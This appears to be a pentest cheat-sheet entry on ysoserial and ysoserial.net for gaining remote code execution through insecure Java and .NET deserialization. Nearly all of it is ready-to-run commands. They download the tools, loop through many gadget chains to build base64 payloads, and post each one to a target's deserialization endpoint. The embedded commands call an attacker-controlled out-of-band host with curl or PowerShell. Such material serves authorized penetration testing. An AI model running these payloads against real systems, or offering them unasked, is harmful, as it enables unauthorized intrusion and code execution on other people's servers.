# 02.12 ysoserial and ysoserial.net

> Generate Java and .NET deserialization gadget chains for RCE via insecure deserialization.

## Overview

ysoserial is Java's deserialization-exploit toolkit; ysoserial.net is its .NET counterpart. Each generates serialized blobs that, when deserialized by a vulnerable target, execute arbitrary commands via 'gadget chains' (CommonsCollections, Spring1, JSON1, etc. for Java; BinaryFormatter, JsonNetSerializer for .NET). Critical for any post-auth Java/.NET RCE.

## Steps

- **Step 1** - Download release JAR (Java) or release zip (.NET).
- **Step 2** - Pick a gadget class matching libraries on target.
- **Step 3** - Generate base64 payload.
- **Step 4** - Submit to deserialization endpoint.

## Commands

### Install Java ysoserial

```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
```

### Install ysoserial.net

```bash
wget https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial.net-master.zip
unzip ysoserial.net-master.zip
```

### List Java gadgets

```bash
java -jar ysoserial.jar
```

### Java gadget brute (try each)

```bash
for g in CommonsCollections1 CommonsCollections5 CommonsCollections6 Spring1 Spring2 Hibernate1 Jdk7u21 JSON1; do
    java -jar ysoserial.jar $g 'curl http://<INTERACTSH>/$g' | base64 -w0 > payload_$g.b64
done
for f in payload_*.b64; do
    curl -s -H 'Content-Type: application/octet-stream' --data-binary "@$f" 'https://<TARGET>/deserialize-endpoint'
    sleep 5
done
```

### .NET gadget BinaryFormatter

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'curl http://<INTERACTSH>'
```

### .NET JsonNet ObjectDataProvider

```bash
ysoserial.exe -f Json.Net -g ObjectDataProvider -c 'powershell -c "iwr http://<INTERACTSH>"'
```
